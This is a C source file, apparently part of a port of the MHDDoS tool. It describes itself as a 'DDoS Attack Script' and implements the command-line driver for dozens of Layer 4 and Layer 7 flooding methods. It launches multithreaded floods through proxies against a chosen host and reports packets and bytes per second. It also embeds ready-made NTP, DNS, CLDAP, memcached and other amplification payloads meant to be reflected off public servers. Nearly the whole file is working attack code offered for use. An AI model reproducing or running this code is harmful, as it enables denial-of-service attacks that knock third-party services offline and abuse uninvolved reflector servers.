#include "mhddos.h"

static void usage(const char *prog) {
    const char *l4_methods = "TCP, UDP, SYN, ICMP, VSE, TS3, MCPE, FIVEM, FIVEM-TOKEN, "
                             "OVH-UDP, MINECRAFT, CPS, CONNECTION, MCBOT, "
                             "MEM, NTP, DNS, ARD, CLDAP, CHAR, RDP";
    int l4_count = 21;
    const char *l7_methods = "CFB, BYPASS, GET, POST, OVH, STRESS, DYN, SLOW, HEAD, "
                             "NULL, COOKIE, PPS, EVEN, GSB, DGB, AVB, CFBUAM, "
                             "APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER, TOR, RHEX, STOMP";
    int l7_count = 26;
    const char *tools_methods = "INFO, TSSRV, CFIP, DNS, PING, CHECK, DSTAT";
    int tools_count = 7;
    int total = l4_count + l7_count + 3 + tools_count;
    printf(
        "* MHDDoS - DDoS Attack Script With %d Methods\n"
        "Note: If the Proxy list is empty, The attack will run without proxies\n"
        "      If the Proxy file doesn't exist, the script will download proxies and check them.\n"
        "      Proxy Type 0 = All in config.json\n"
        "      SocksTypes:\n"
        "         - 6 = RANDOM\n"
        "         - 5 = SOCKS5\n"
        "         - 4 = SOCKS4\n"
        "         - 1 = HTTP\n"
        "         - 0 = ALL\n"
        " > Methods:\n"
        " - Layer4\n"
        " | %s | %d Methods\n"
        " - Layer7\n"
        " | %s | %d Methods\n"
        " - Tools\n"
        " | %s | %d Methods\n"
        " - Others\n"
        " | TOOLS, HELP, STOP | 3 Methods\n"
        " - All %d Methods\n"
        "\n"
        "Example:\n"
        "   L7: %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n"
        "   L4: %s <method> <ip:port> <threads> <duration>\n"
        "   L4 Proxied: %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n"
        "   L4 Amplification: %s <method> <ip:port> <threads> <duration> <reflector file (only use with Amplification)>\n",
        total,
        l4_methods, l4_count,
        l7_methods, l7_count,
        tools_methods, tools_count,
        total,
        prog, prog, prog, prog);
    fflush(stdout);
}

static void set_amp_payload(layer4_args_t *args, const uint8_t *payload, int len, int port) {
    memcpy(args->amp_payload, payload, len);
    args->amp_payload_len = len;
    args->amp_port = port;
}

int main(int argc, char *argv[]) {
    srand(time(NULL) ^ getpid());
    get_local_ip(g_local_ip, sizeof(g_local_ip));

    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    char one[64];
    strncpy(one, argv[1], sizeof(one) - 1);
    one[sizeof(one) - 1] = '\0';
    for (int i = 0; one[i]; i++) one[i] = toupper((unsigned char)one[i]);

    if (strcmp(one, "HELP") == 0) {
        usage(argv[0]);
        return 0;
    }
    if (strcmp(one, "STOP") == 0) {
        printf("All Attacks has been Stopped !\n");
        fflush(stdout);
        return 0;
    }

    method_t method = parse_method(one);
    if (method == METHOD_UNKNOWN) {
        fprintf(stderr, BCOLORS_FAIL "Method Not Found %s" BCOLORS_RESET "\n", one);
        usage(argv[0]);
        return 1;
    }

    if (argc < 3) {
        usage(argv[0]);
        return 1;
    }

    volatile int running = 0;
    char urlraw[4096];
    memset(urlraw, 0, sizeof(urlraw));
    strncpy(urlraw, argv[2], sizeof(urlraw) - 1);
    {
        char *p = urlraw;
        while (*p && isspace((unsigned char)*p)) p++;
        if (strncmp(p, "http", 4) != 0) {
            char tmp[4096];
            snprintf(tmp, sizeof(tmp), "http://%s", p);
            strncpy(urlraw, tmp, sizeof(urlraw) - 1);
        }
    }

    if (is_layer7(method)) {
        if (argc < 8) {
            fprintf(stderr, "L7 Usage: %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>\n", argv[0]);
            return 1;
        }

        url_t target;
        parse_url(urlraw, &target);

        char host_ip[256];
        if (strcmp(one, "TOR") != 0) {
            if (!resolve_host(target.host, host_ip, sizeof(host_ip))) {
                fprintf(stderr, BCOLORS_FAIL "Cannot resolve hostname %s" BCOLORS_RESET "\n", target.host);
                return 1;
            }
        } else {
            strncpy(host_ip, target.host, sizeof(host_ip));
        }

        int threads = atoi(argv[4]);
        int rpc = atoi(argv[6]);
        int timer = atoi(argv[7]);
        int proxy_ty = atoi(argv[3]);

        char proxy_path[512];
        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[5]);

        if (argc == 9) {
            fprintf(stderr, "[DEBUG MODE]\n");
        }

        char **useragents = NULL;
        int ua_count = load_lines("files/useragent.txt", &useragents, MAX_USERAGENTS);
        if (ua_count == 0) {
            fprintf(stderr, BCOLORS_FAIL "The Useragent file doesn't exist " BCOLORS_RESET "\n");
            return 1;
        }

        char **referers = NULL;
        int ref_count = load_lines("files/referers.txt", &referers, MAX_REFERERS);
        if (ref_count == 0) {
            fprintf(stderr, BCOLORS_FAIL "The Referer file doesn't exist " BCOLORS_RESET "\n");
            return 1;
        }

        if (threads > 1000)
            printf(BCOLORS_WARNING "Thread is higher than 1000" BCOLORS_RESET "\n");
        if (rpc > 100)
            printf(BCOLORS_WARNING "RPC (Request Pre Connection) is higher than 100" BCOLORS_RESET "\n");

        proxy_t *proxies = NULL;
        int proxy_count = 0;
        proxy_type_t pt = (proxy_type_t)proxy_ty;
        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
        if (pt != PROXY_NONE) {
            proxy_t *proxy_arr = malloc(sizeof(proxy_t) * MAX_PROXIES);
            if (proxy_arr) {
                proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
                if (proxy_count > 0) {
                    proxies = proxy_arr;
                    printf(BCOLORS_WARNING "Proxy Count: " BCOLORS_OKBLUE "%d" BCOLORS_RESET "\n", proxy_count);
                } else {
                    printf(BCOLORS_WARNING "Empty Proxy File, running flood without proxy" BCOLORS_RESET "\n");
                    free(proxy_arr);
                }
            }
        }

        pthread_t *tids = malloc(sizeof(pthread_t) * threads);
        layer7_args_t *thread_args = calloc(threads, sizeof(layer7_args_t));

        for (int i = 0; i < threads; i++) {
            thread_args[i].target = target;
            strncpy(thread_args[i].host_ip, host_ip, sizeof(thread_args[i].host_ip));
            thread_args[i].method = method;
            thread_args[i].rpc = rpc;
            thread_args[i].thread_id = i;
            thread_args[i].proxies = proxies;
            thread_args[i].proxy_count = proxy_count;
            thread_args[i].useragents = useragents;
            thread_args[i].useragent_count = ua_count;
            thread_args[i].referers = referers;
            thread_args[i].referer_count = ref_count;
            thread_args[i].running = &running;
            thread_args[i].use_ssl = (strcasecmp(target.scheme, "https") == 0);
            strncpy(thread_args[i].local_ip, g_local_ip, sizeof(thread_args[i].local_ip));
            pthread_create(&tids[i], NULL, layer7_thread, &thread_args[i]);
        }

        printf(BCOLORS_WARNING "Attack Started to" BCOLORS_OKBLUE " %s " BCOLORS_WARNING
               "with" BCOLORS_OKBLUE " %s " BCOLORS_WARNING "method for" BCOLORS_OKBLUE
               " %d " BCOLORS_WARNING "seconds, threads:" BCOLORS_OKBLUE " %d" BCOLORS_WARNING
               "!" BCOLORS_RESET "\n", target.host, one, timer, threads);
        fflush(stdout);

        running = 1;
        time_t ts = time(NULL);
        while (time(NULL) < ts + timer) {
            long req = atomic_exchange(&REQUESTS_SENT, 0);
            long byt = atomic_exchange(&BYTES_SEND, 0);
            char pps_buf[64], bps_buf[64];
            humanformat(req, pps_buf, sizeof(pps_buf));
            humanbytes(byt, bps_buf, sizeof(bps_buf));
            double pct = (double)(time(NULL) - ts) / timer * 100.0;
            printf(BCOLORS_WARNING "Target:" BCOLORS_OKBLUE " %s," BCOLORS_WARNING
                   " Port:" BCOLORS_OKBLUE " %d," BCOLORS_WARNING
                   " Method:" BCOLORS_OKBLUE " %s" BCOLORS_WARNING
                   " PPS:" BCOLORS_OKBLUE " %s," BCOLORS_WARNING
                   " BPS:" BCOLORS_OKBLUE " %s / %.0f%%" BCOLORS_RESET "\n",
                   target.host, target.port, one, pps_buf, bps_buf, pct);
            fflush(stdout);
            sleep(1);
        }
        running = 0;
        sleep(1);
        free(thread_args);
        free(tids);
        if (proxies) free(proxies);

    } else if (is_layer4(method)) {
        if (argc < 5) {
            fprintf(stderr, "L4 Usage: %s <method> <ip:port> <threads> <duration>\n", argv[0]);
            return 1;
        }

        url_t target;
        parse_url(urlraw, &target);

        char target_ip[256];
        if (!resolve_host(target.host, target_ip, sizeof(target_ip))) {
            fprintf(stderr, BCOLORS_FAIL "Cannot resolve hostname %s" BCOLORS_RESET "\n", target.host);
            return 1;
        }

        int port = target.port;
        if (port > 65535 || port < 1) {
            fprintf(stderr, BCOLORS_FAIL "Invalid Port [Min: 1 / Max: 65535] " BCOLORS_RESET "\n");
            return 1;
        }

        if ((method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
             method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
             method == METHOD_ARD || method == METHOD_SYN || method == METHOD_ICMP) &&
            !check_raw_socket()) {
            fprintf(stderr, BCOLORS_FAIL "Cannot Create Raw Socket" BCOLORS_RESET "\n");
            return 1;
        }

        if (is_amp(method)) {
            printf(BCOLORS_WARNING "this method need spoofable servers please check" BCOLORS_RESET "\n");
            printf(BCOLORS_WARNING "https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack" BCOLORS_RESET "\n");
        }

        int threads = atoi(argv[3]);
        int timer = atoi(argv[4]);
        proxy_t *proxies = NULL;
        int proxy_count = 0;
        char **refs = NULL;
        int ref_count = 0;

        if (!port) {
            printf(BCOLORS_WARNING "Port Not Selected, Set To Default: 80" BCOLORS_RESET "\n");
            port = 80;
        }

        if (argc >= 6) {
            char *argfive = argv[5];
            while (*argfive && isspace((unsigned char)*argfive)) argfive++;
            if (strlen(argfive) > 0) {
                if (method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
                    method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
                    method == METHOD_ARD) {
                    char refl_path[512];
                    snprintf(refl_path, sizeof(refl_path), "files/%s", argfive);
                    FILE *rf = fopen(refl_path, "r");
                    if (!rf) {
                        fprintf(stderr, BCOLORS_FAIL "The reflector file doesn't exist" BCOLORS_RESET "\n");
                        return 1;
                    }
                    if (argc == 7) fprintf(stderr, "[DEBUG MODE]\n");
                    refs = malloc(sizeof(char*) * MAX_REFS);
                    char line[256];
                    while (fgets(line, sizeof(line), rf) && ref_count < MAX_REFS) {
                        line[strcspn(line, "\r\n")] = 0;
                        if (strlen(line) > 6) { refs[ref_count++] = strdup(line); }
                    }
                    fclose(rf);
                    if (ref_count == 0) { fprintf(stderr, BCOLORS_FAIL "Empty Reflector File " BCOLORS_RESET "\n"); return 1; }
                } else {
                    int is_digit = 1;
                    for (int i = 0; argfive[i]; i++) if (!isdigit((unsigned char)argfive[i])) { is_digit = 0; break; }
                    if (is_digit && argc >= 7) {
                        if (argc == 8) fprintf(stderr, "[DEBUG MODE]\n");
                        int proxy_ty = atoi(argfive);
                        proxy_type_t pt = (proxy_type_t)proxy_ty;
                        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
                        char proxy_path[512];
                        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[6]);
                        proxy_t *proxy_arr = malloc(sizeof(proxy_t) * MAX_PROXIES);
                        if (proxy_arr) {
                            proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
                            if (proxy_count > 0) proxies = proxy_arr;
                            else free(proxy_arr);
                        }
                        if (method != METHOD_MINECRAFT && method != METHOD_MCBOT &&
                            method != METHOD_TCP && method != METHOD_CPS && method != METHOD_CONNECTION) {
                            fprintf(stderr, BCOLORS_FAIL "this method cannot use for layer4 proxy" BCOLORS_RESET "\n");
                            return 1;
                        }
                    } else {
                        fprintf(stderr, "[DEBUG MODE]\n");
                    }
                }
            }
        }

        int protocolid = MINECRAFT_DEFAULT_PROTOCOL;
        if (method == METHOD_MCBOT) {
            int probe = socket(AF_INET, SOCK_STREAM, 0);
            if (probe >= 0) {
                struct sockaddr_in addr;
                memset(&addr, 0, sizeof(addr));
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target_ip, &addr.sin_addr);
                struct timeval tv = {2, 0};
                setsockopt(probe, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(probe, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                if (connect(probe, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                    uint8_t hs[1024];
                    int hslen = mc_handshake(target_ip, port, protocolid, 1, hs);
                    send(probe, hs, hslen, 0);
                    uint8_t ping_pkt[16];
                    uint8_t zero = 0x00;
                    int pinglen = mc_data(&zero, 1, ping_pkt);
                    send(probe, ping_pkt, pinglen, 0);
                    uint8_t resp[1024];
                    int rlen = recv(probe, resp, sizeof(resp), 0);
                    if (rlen > 0) {
                        char *p = strstr((char*)resp, "\"protocol\":");
                        if (p) {
                            int pv = atoi(p + 11);
                            if (pv > 47 && pv < 758) protocolid = pv;
                        }
                    }
                }
                close(probe);
            }
        }

        pthread_t *tids = malloc(sizeof(pthread_t) * threads);
        layer4_args_t *thread_args = calloc(threads, sizeof(layer4_args_t));

        for (int i = 0; i < threads; i++) {
            strncpy(thread_args[i].target_ip, target_ip, sizeof(thread_args[i].target_ip));
            thread_args[i].target_port = port;
            thread_args[i].method = method;
            thread_args[i].protocolid = protocolid;
            thread_args[i].proxies = proxies;
            thread_args[i].proxy_count = proxy_count;
            thread_args[i].refs = refs;
            thread_args[i].ref_count = ref_count;
            thread_args[i].running = &running;
            strncpy(thread_args[i].local_ip, g_local_ip, sizeof(thread_args[i].local_ip));
            if (method == METHOD_ICMP) thread_args[i].target_port = 0;

            if (method == METHOD_RDP) {
                uint8_t p[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 16, 3389);
            } else if (method == METHOD_CLDAP) {
                uint8_t p[] = {0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,0x00,
                               0x02,0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,0x6a,0x65,
                               0x63,0x74,0x63,0x6c,0x61,0x73,0x73,0x30,0x00};
                set_amp_payload(&thread_args[i], p, 39, 389);
            } else if (method == METHOD_MEM) {
                uint8_t p[] = {0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,'g','e','t','s',' ','p',' ','h',' ','e','\n'};
                set_amp_payload(&thread_args[i], p, 19, 11211);
            } else if (method == METHOD_CHAR) {
                uint8_t p[] = {0x01};
                set_amp_payload(&thread_args[i], p, 1, 19);
            } else if (method == METHOD_ARD) {
                uint8_t p[] = {0x00,0x14,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 4, 3283);
            } else if (method == METHOD_NTP) {
                uint8_t p[] = {0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 8, 123);
            } else if (method == METHOD_DNS_AMP) {
                uint8_t p[] = {0x45,0x67,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x73,0x6c,
                               0x00,0x00,0xff,0x00,0x01,0x00,0x00,0x29,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 31, 53);
            }
            pthread_create(&tids[i], NULL, layer4_thread, &thread_args[i]);
        }

        printf(BCOLORS_WARNING "Attack Started to" BCOLORS_OKBLUE " %s " BCOLORS_WARNING
               "with" BCOLORS_OKBLUE " %s " BCOLORS_WARNING "method for" BCOLORS_OKBLUE
               " %d " BCOLORS_WARNING "seconds, threads:" BCOLORS_OKBLUE " %d" BCOLORS_WARNING
               "!" BCOLORS_RESET "\n", target_ip, one, timer, threads);
        fflush(stdout);

        running = 1;
        time_t ts = time(NULL);
        while (time(NULL) < ts + timer) {
            long req = atomic_exchange(&REQUESTS_SENT, 0);
            long byt = atomic_exchange(&BYTES_SEND, 0);
            char pps_buf[64], bps_buf[64];
            humanformat(req, pps_buf, sizeof(pps_buf));
            humanbytes(byt, bps_buf, sizeof(bps_buf));
            double pct = (double)(time(NULL) - ts) / timer * 100.0;
            printf(BCOLORS_WARNING "Target:" BCOLORS_OKBLUE " %s," BCOLORS_WARNING
                   " Port:" BCOLORS_OKBLUE " %d," BCOLORS_WARNING
                   " Method:" BCOLORS_OKBLUE " %s" BCOLORS_WARNING
                   " PPS:" BCOLORS_OKBLUE " %s," BCOLORS_WARNING
                   " BPS:" BCOLORS_OKBLUE " %s / %.0f%%" BCOLORS_RESET "\n",
                   target_ip, port, one, pps_buf, bps_buf, pct);
            fflush(stdout);
            sleep(1);
        }
        running = 0;
        sleep(1);
        free(thread_args);
        free(tids);
        if (proxies) free(proxies);
    } else {
        usage(argv[0]);
    }

    return 0;
}
